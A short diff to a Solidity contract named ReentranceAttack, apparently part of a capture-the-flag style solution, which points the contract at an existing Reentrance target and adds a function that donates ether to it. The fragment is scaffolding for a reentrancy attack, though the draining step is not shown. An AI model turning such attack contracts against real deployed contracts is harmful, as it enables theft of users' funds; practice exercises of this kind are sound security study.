@@ -7,6 +7,10 @@ contract ReentranceAttack {
     Reentrance reentrance;
 
     constructor(address _reentranceContractAddress) public {
-        reentrance = new Reentrance(_reentranceContractAddress);
+        reentrance = Reentrance(payable(_reentranceContractAddress));
+    }
+
+    function sendDonation(address _to, uint256 _amountToDonate) public {
+        reentrance.donate{value: _amountToDonate}(_to);
     }
 }
